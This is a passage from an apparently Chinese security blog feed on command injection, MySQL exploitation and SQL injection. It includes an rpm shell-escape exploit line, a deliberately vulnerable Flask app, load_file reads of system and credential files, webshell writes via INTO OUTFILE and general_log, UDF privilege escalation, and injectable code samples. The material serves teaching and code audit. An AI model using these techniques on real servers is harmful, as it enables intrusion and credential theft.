class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));String result= read.readLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;INF0:&quot;</span>+ result);&#125;</span><br><span class="line">        <span class="keyword">catch</span>(I0Exception e)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="system类"><a href="#system类" class="headerlink" title="system类"></a>system类</h3><p>如果是执行system函数，或者类似system函数，他们都是直接走的fork–&gt;execve流程(调用外部sh -c)，这种情况下，我们的输入被拼接加入到作为bash-c的参数，而bash -c是支持shel语法的，所以我们能够很轻易的进行拼接、绕过，这种也是最常见的RCE攻击，简单的一笔。</p><h3 id="execve类"><a href="#execve类" class="headerlink" title="execve类"></a>execve类</h3><p>比如Runtime.getRuntime().exec()和subprocess.cal(cmd, shell&#x3D;False)这两者，走的流程是直接execve，在这种情况下，我们的输入只能作为固定进程的参数，那么我们就没办法用shell语法了，与任何拼接都没有关系了。这种情况怎么绕过呢?</p><h3 id="参数黑魔法"><a href="#参数黑魔法" class="headerlink" title="参数黑魔法"></a>参数黑魔法</h3><p>当我们不能执行任意进程的时候(我们的输入只是某个特定进程的输入的时候)依然能找到一些撸点，但是撸点的大小，取决的使用的进程程序本身的参数是不是能注入</p><p>curl可以进行文件读取。</p><p>curl支持的协议可以看这里(<a href="https://www.cnblogs.com/zhanglianghhh/p/11326428.html">https://www.cnblogs.com/zhanglianghhh/p/11326428.html</a>)</p><p>rpm的黑魔法可以进行rce<br>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> shlex</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rpm&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rpm_install</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    rpm = request.args.get(<span class="string">&quot;rpm&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> rpm <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> rpm.strip() == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;please input rpm to install&quot;</span></span><br><span class="line">    rpm = urllib.parse.unquote(rpm)</span><br><span class="line">    cmd = <span class="string">&quot;rpm &quot;</span> + rpm</span><br><span class="line">    cmd_list = shlex.split(cmd)</span><br><span class="line">    process = subprocess.Popen(cmd_list, shell=<span class="literal">False</span>, stdin=subprocess.PIPE, stdout=subprocess.PIPE,</span><br><span class="line">                               stderr=subprocess.STDOUT)</span><br><span class="line">    result = <span class="string">&quot;result is:\n&quot;</span></span><br><span class="line">    <span class="keyword">while</span> process.poll() <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        line = process.stdout.readline()</span><br><span class="line">        line = line.strip()</span><br><span class="line">        <span class="keyword">if</span> line:</span><br><span class="line">            result = result + <span class="built_in">str</span>(line)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/curl&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">curl</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> url <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> url.strip() == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;please input url&quot;</span></span><br><span class="line">    cmd = [<span class="string">&#x27;curl&#x27;</span>, url]</span><br><span class="line">    process = subprocess.Popen(cmd, shell=<span class="literal">False</span>, stdin=subprocess.PIPE, stdout=subprocess.PIPE,</span><br><span class="line">                               stderr=subprocess.STDOUT)</span><br><span class="line">    result = <span class="string">&quot;result is:\n&quot;</span></span><br><span class="line">    <span class="keyword">while</span> process.poll() <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        line = process.stdout.readline()</span><br><span class="line">        line = line.strip()</span><br><span class="line">        <span class="keyword">if</span> line:</span><br><span class="line">            result = result + <span class="built_in">str</span>(line)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>上面代码是用python所写的网站app.py<br>利用方式：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm --<span class="built_in">eval</span> <span class="string">&#x27;%&#123;lua:os.execute(&quot;/bin/sh&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入与数据库利用</title>
      <link href="/2025/08/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E7%AF%87-mysql/"/>
      <url>/2025/08/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E7%AF%87-mysql/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql文件读写"><a href="#mysql文件读写" class="headerlink" title="mysql文件读写"></a>mysql文件读写</h1><h2 id="文件读写的限制"><a href="#文件读写的限制" class="headerlink" title="文件读写的限制"></a>文件读写的限制</h2><p>具体可以看<a href="https://dev.mysql.com/doc/refman/5.6/en/server-system-variables.html#sysvar_secure_file_priv">这里</a>呀，官方是最准的。取决于secure_file_priv变量</p><p>查看方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MySQL [bertram]&gt;show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv | NULL  |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure><p>又因为 secure_file_priv 参数是只读参数，不能使用set global命令修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MySQL [bertram]&gt; set global secure_file_priv=&#x27;&#x27;;</span><br><span class="line">ERROR 1238 (HY000): Variable &#x27;secure_file_priv&#x27; is a read only variable</span><br></pre></td></tr></table></figure><p><img src="https://imgurl-1304573507.cos.ap-shanghai.myqcloud.com/image-20221107224929112.png" alt="image-20221107224929112"></p><p>在5.6.34版本以上：</p><p>1.空字符串：可以写入&#x2F;读取到任何位置</p><p>2.某目录：可以写入&#x2F;读取到该目录</p><p>3.NULL：不可读写</p><p>默认：与操作系统有关，windows上默认是NULL；linux上默认是一个指定路径。</p><p>在5.6.34版本以下</p><p>1.空字符串：可以写入&#x2F;读取到任何位置</p><p>2.某目录：可以写入&#x2F;读取到该目录</p><p>默认：空字符串</p><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>没什么其他的好方法，就两个命令</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">load</span> data infile <span class="string">&#x27;/etc/passwd&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> a;</span><br></pre></td></tr></table></figure><p>但是可以读一些比较有用的文件。</p><h3 id="1-各种配置文件"><a href="#1-各种配置文件" class="headerlink" title="1.各种配置文件"></a>1.各种配置文件</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">MYSQL注入中，load_file()函数在获得webshell以及提权过程中起着十分重要的作用，常被用来读取各种配置文件，如：</span><br><span class="line"><span class="keyword">/usr/</span>local<span class="keyword">/app/</span>apache2<span class="keyword">/conf/</span>httpd.conf <span class="comment">//apache2缺省配置文件</span></span><br><span class="line"><span class="keyword">/usr/</span>local<span class="keyword">/apache2/</span>conf/httpd.conf</span><br><span class="line"><span class="keyword">/usr/</span>local<span class="keyword">/app/</span>apache2<span class="keyword">/conf/</span>extra/httpd-vhosts.conf <span class="comment">//虚拟网站设置</span></span><br><span class="line"><span class="keyword">/usr/</span>local<span class="keyword">/app/</span>php5<span class="keyword">/lib/</span>php.ini <span class="comment">//PHP相关设置</span></span><br><span class="line"><span class="keyword">/etc/</span>sysconfig/iptables <span class="comment">//从中得到防火墙规则策略</span></span><br><span class="line"><span class="keyword">/etc/</span>httpd<span class="keyword">/conf/</span>httpd.conf <span class="comment">// apache配置文件</span></span><br><span class="line"><span class="keyword">/etc/</span>rsyncd.conf <span class="comment">//同步程序配置文件</span></span><br><span class="line"><span class="keyword">/etc/</span>sysconfig<span class="keyword">/network-scripts/</span>ifcfg-eth0 <span class="comment">//查看IP.</span></span><br><span class="line"><span class="keyword">/etc/</span>my.cnf <span class="comment">//mysql的配置文件</span></span><br><span class="line"><span class="keyword">/etc/</span>redhat-release <span class="comment">//系统版本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">/etc/</span>issue</span><br><span class="line"><span class="keyword">/etc/</span>issue.net</span><br><span class="line"><span class="symbol">c:</span>\mysql\data\mysql\user.MYD <span class="comment">//存储了mysql.user表中的数据库连接密码</span></span><br><span class="line"><span class="symbol">c:</span>\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini <span class="comment">//存储了虚拟主机网站路径和密码</span></span><br><span class="line"><span class="symbol">c:</span>\Program Files\Serv-U\ServUDaemon.ini</span><br><span class="line"><span class="symbol">c:</span>\windows\my.ini <span class="comment">//MYSQL配置文件</span></span><br><span class="line"><span class="symbol">c:</span>\windows\system32\inetsrv\MetaBase.xml <span class="comment">//IIS配置文件</span></span><br><span class="line"></span><br><span class="line">等等。实际上，load_file()的作用不止于此，它还可以用来读取系统中的二进制文件，</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">c:</span>\windows\repair\sam <span class="comment">//存储了WINDOWS系统初次安装的密码</span></span><br><span class="line"><span class="symbol">c:</span>\Program Files\ Serv-U\ServUAdmin.exe <span class="comment">//6.0版本以前的serv-u管理员密码存储于此</span></span><br><span class="line"><span class="symbol">c:</span>\Program Files\RhinoSoft.com\ServUDaemon.exe</span><br><span class="line"><span class="symbol">C:</span>\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</span><br><span class="line"><span class="comment">//存储了pcAnywhere的登陆密码</span></span><br></pre></td></tr></table></figure><h3 id="2-代码审计"><a href="#2-代码审计" class="headerlink" title="2.代码审计"></a>2.代码审计</h3><p>如果存在一个注入点，又知道网站绝对路径（也可以通过先读默认中间件配置文件，获取网站根路径，再读文件），那么可以读取网站源码，逐个读取后，进行审计。</p><h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;111&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/tmp/1.txt&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="linux下"><a href="#linux下" class="headerlink" title="linux下"></a>linux下</h4><p>linux下，mysql为mysql用户权限，是一个低权限用户，如果web目录有权限的话，可以尝试写入webshell到web目录。</p><h4 id="windows下"><a href="#windows下" class="headerlink" title="windows下"></a>windows下</h4><p>windows，如果管理员配置mysql服务不当（很可能），那么可以写入到任意目录，当然前提是secure_file_priv变量没限制。就可以写webshell写启动项、各种写了。</p><p>windows下还有个mof提权，太老了，windows2003的，有兴趣可以看看<a href="https://www.freebuf.com/articles/web/264790.html">这里</a></p><h3 id="写log文件！"><a href="#写log文件！" class="headerlink" title="写log文件！"></a>写log文件！</h3><p>这个函数是不受<strong>secure_file_priv</strong>变量限制的。</p><p>查看 general log状态：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show <span class="keyword">variables</span> like <span class="comment">&quot;%general%&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show <span class="keyword">variables</span> like <span class="comment">&quot;%general%&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://imgurl-1304573507.cos.ap-shanghai.myqcloud.com/1594571483.png!small" alt="img"></p><p>一般 general_log 默认是关闭的，不过这个配置我们可以手动开起来。</p><p>设置日志输出类型为文件：</p><p>有时候 mysql 默认日志输出类型不是 FILE 而是 TABLE。</p><p>如果是TABLE的话，是不会将日志输出为文件格式的。</p><p><img src="https://imgurl-1304573507.cos.ap-shanghai.myqcloud.com/1594571525.png!small" alt="img"></p><p>需要将其类型设置为 FILE</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global <span class="attribute">log_output</span>=<span class="string">&quot;FILE&quot;</span>;</span><br></pre></td></tr></table></figure><p>设置输出文件路径：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global <span class="attribute">general_log_file</span>=<span class="string">&quot;/var/www/html/1.php&quot;</span>;</span><br></pre></td></tr></table></figure><p>开启 general log：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global <span class="attribute">general_log</span>=on;</span><br></pre></td></tr></table></figure><p>由于一开启 general log，此时在 mysql 上的所有操作都会被记录下来。为了让输出的文件杂质少一点。我们细节一点最后再开启 general log</p><p><img src="https://imgurl-1304573507.cos.ap-shanghai.myqcloud.com/1594571598.png!small" alt="img"><img src="https://imgurl-1304573507.cos.ap-shanghai.myqcloud.com/1594571611.png!small" alt="img"></p><p>同时这里也可以用慢查询的日志来写入，这样可以让日志杂质更少一点。</p><p>与上面基本一样，具体看<a href="https://www.cnblogs.com/zzjdbk/p/12992186.html">这里</a>或者<a href="http://t.zoukankan.com/forforever-p-13452151.html">这里</a></p><h1 id="udf相关"><a href="#udf相关" class="headerlink" title="udf相关"></a>udf相关</h1><ol><li>udf简介：<ul><li>UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过 <strong>自定义函数</strong> 来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</li><li>UDF官方介绍以及其函数定义请参考（<a href="http://dev.mysql.com/doc/refman/5.5/en/adding-functions.html%E3%80%81https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html%EF%BC%89">http://dev.mysql.com/doc/refman/5.5/en/adding-functions.html、https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html）</a></li></ul></li><li>udf提权原理<ul><li>在udf.dll&#x2F;udf.so文件中自定义一些能够以mysql权限执行系统命令的函数，然后将该函数导入到mysql数据库中，通过mysql数据库去以mysql权限执行系统命令。</li></ul></li></ol><h2 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h2><p>收到两个变量的双重限制<strong>plugin_dir</strong>和<strong>secure_file_priv</strong></p><p>这一块总体趋向于越来越安全，具体的可以看老外的这个文章</p><p><a href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation/">https://osandamalith.com/2018/02/11/mysql-udf-exploitation/</a></p><p><img src="https://imgurl-1304573507.cos.ap-shanghai.myqcloud.com/image-20221108000639177.png" alt="image-20221108000639177"></p><p>先了解下plugin_dir变量</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show <span class="keyword">variables</span> like <span class="comment">&quot;%plugin%&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://imgurl-1304573507.cos.ap-shanghai.myqcloud.com/image-20221108001443976.png" alt="image-20221108001443976"></p><h3 id="5-0-67版本："><a href="#5-0-67版本：" class="headerlink" title="&gt;&#x3D;5.0.67版本："></a>&gt;&#x3D;5.0.67版本：</h3><p>udf文件必须位于插件目录，插件目录来自于变量plugin_dir，且该变量在默认为@@BASEDIR&#x2F;lib&#x2F;plugin，在之前的版本中默认为空</p><p>如果变量plugin_dir为空，那么udf文件必须位于动态链接库能找到的地方，比如：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql二进制文件所在的地方</span><br><span class="line"><span class="keyword">/lib/</span></span><br><span class="line"><span class="keyword">/lib64/</span></span><br><span class="line"><span class="symbol">c:</span>\windows</span><br><span class="line"><span class="symbol">c:</span>\windows\system</span><br><span class="line"><span class="symbol">c:</span>\windows\system32</span><br></pre></td></tr></table></figure><h2 id="写入权限限制"><a href="#写入权限限制" class="headerlink" title="写入权限限制"></a>写入权限限制</h2><p>可能plugin目录并不存在，那么可以尝试用webshell去创建该目录，再写入udf文件到该目录；如果webshell没有权限创建该目录，windows下可以用ntfs的特性尝试利用mysql去创建。</p><p>具体看看这里就好了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.cnblogs.com<span class="regexp">/zzjdbk/</span>p/<span class="number">12990164</span>.html</span><br></pre></td></tr></table></figure><h2 id="udf编译"><a href="#udf编译" class="headerlink" title="udf编译"></a>udf编译</h2><p>我们完全可以自己定制一个udf，这个网上也有源码，贴几个案例</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>xz.aliyun.com<span class="regexp">/t/</span><span class="number">2365</span></span><br><span class="line">http:<span class="regexp">//my</span>sql.taobao.org<span class="regexp">/monthly/</span><span class="number">2019</span><span class="regexp">/02/</span><span class="number">08</span>/</span><br><span class="line">https:<span class="regexp">//</span>www.cnblogs.com<span class="regexp">/yunsicai/</span>p/<span class="number">4080864</span>.html</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="两个有名的cve"><a href="#两个有名的cve" class="headerlink" title="两个有名的cve"></a>两个有名的cve</h1><p>具体漏洞分析没找到，直接看利用吧</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>//xz.aliyun.com/t/<span class="number">1122</span></span><br><span class="line"><span class="symbol">https:</span>//www.sqlsec.com/<span class="number">2020</span>/<span class="number">11</span>/mysql.html#MSF-<span class="variable">%E5</span><span class="variable">%90</span><span class="variable">%AF</span><span class="variable">%E5</span><span class="variable">%8</span>A<span class="variable">%A8</span><span class="variable">%E9</span><span class="variable">%A1</span><span class="variable">%B9</span><span class="variable">%E6</span><span class="variable">%8</span>F<span class="variable">%90</span><span class="variable">%E6</span><span class="variable">%9</span>D<span class="variable">%83</span></span><br></pre></td></tr></table></figure><h1 id="ssrf-mysql"><a href="#ssrf-mysql" class="headerlink" title="ssrf+mysql"></a>ssrf+mysql</h1><p>其实已经超出mysql的范畴，更像是利用ssrf</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>book.hacktricks.xyz<span class="regexp">/pentesting-web/</span>sql-injection<span class="regexp">/mysql-injection/my</span>sql-ssrf</span><br><span class="line">https:<span class="regexp">//</span>paper.seebug.org<span class="regexp">/510/</span></span><br></pre></td></tr></table></figure><h1 id="读客户端文件"><a href="#读客户端文件" class="headerlink" title="读客户端文件"></a>读客户端文件</h1><p>这个还是一个比较有意思的利用，通过构造恶意的服务端，可以读取客户端的文件。在一些php&#x2F;jsp&#x2F;asp探针上均可以利用。而且在某些情况下还能rce（当然我觉得都是理论存在而已）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.anquanke.com<span class="regexp">/post/i</span>d/<span class="number">106488</span></span><br><span class="line">https:<span class="regexp">//</span>www.secpulse.com<span class="regexp">/archives/</span><span class="number">175684</span>.html</span><br><span class="line">https:<span class="regexp">//</span>www.modb.pro<span class="regexp">/db/</span><span class="number">51823</span></span><br><span class="line">https:<span class="regexp">//</span>www.anquanke.com<span class="regexp">/post/i</span>d/<span class="number">197518</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入与数据库利用</title>
      <link href="/2025/08/07/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/08/07/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注⼊的基础代码样例"><a href="#sql注⼊的基础代码样例" class="headerlink" title="sql注⼊的基础代码样例"></a>sql注⼊的基础代码样例</h1><p><strong>php：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$db</span> = <span class="title function_ invoke__">init_db</span>();</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]; <span class="comment">//input: fuckdada&#x27; and 1=1#</span></span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from table where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>); </span><br></pre></td></tr></table></figure><p><strong>.net&#x2F;aspx：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">string</span> <span class="variable">connectionstring</span> <span class="operator">=</span> <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"><span class="type">SqlConnection</span> <span class="variable">con</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlConnection</span>(connectionstring);</span><br><span class="line">con.Open();</span><br><span class="line"></span><br><span class="line"><span class="type">string</span> <span class="variable">username</span> <span class="operator">=</span> Request.QueryString[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="type">string</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from table where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="type">SqlDataAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlDataAdapter</span>(sql, con);</span><br><span class="line"><span class="type">DataSet</span> <span class="variable">dataSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">System</span>.Data.DataSet();</span><br><span class="line">adapter.Fill(dataSet);</span><br><span class="line">con.Close()</span><br></pre></td></tr></table></figure><p><strong>java:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">conn = DBHerpel.getConnection();</span><br><span class="line"><span class="keyword">if</span> (conn == <span class="literal">null</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">Sql</span> <span class="operator">=</span> <span class="string">&quot;select * from table where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">stt = conn.createStatement();</span><br><span class="line">set = stt.executeQuery(Sql);</span><br></pre></td></tr></table></figure><p><strong>python（flask）:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line"> username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line"> sql = <span class="string">&quot;select * from table where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line"> conn = connect(host=<span class="string">&#x27;localhost&#x27;</span>,port=<span class="number">3306</span>,user=<span class="string">&#x27;root&#x27;</span>,password=<span class="string">&#x27;&#x27;</span>,database=<span class="string">&#x27;test&#x27;</span>,charset=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"> cs1 = conn.cursor()</span><br><span class="line"> count = cs1.execute(sql)</span><br></pre></td></tr></table></figure><p>以上全都是不同语⾔在不调⽤orm框架，直接调⽤原⽣数据库操作函数时的⽤例。（其实orm<br>框架的底层也是调⽤了原⽣数据库操作函数，只是orm帮开发者做了封装和对象映射的步骤）<br>就可以理解这个漏洞：</p><ul><li>仅仅抓住输⼊</li><li>当数据流⼊侵到控制流时，漏洞就产⽣了</li><li>“数据流⼊侵控制流”产⽣的⻛险点，在于不同层⾯组件的交汇处（如：代码层与数据库层）</li></ul><p>java&#x2F;MyBatis:<br>MyBatis需要有⼀个xml配置⽂件来来绑定映射关系</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findUserByName&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;java.lang.String&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">resultType</span>=<span class="string">&quot;cn.itcast.mybatis.po.User&quot;</span>&gt;</span></span><br><span class="line">        &lt;  !-- 拼接 MySQL,引起 SQL 注⼊ --&gt;</span><br><span class="line">        SELECT * FROM table WHERE username = &#x27;$&#123;value&#125;&#x27;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td 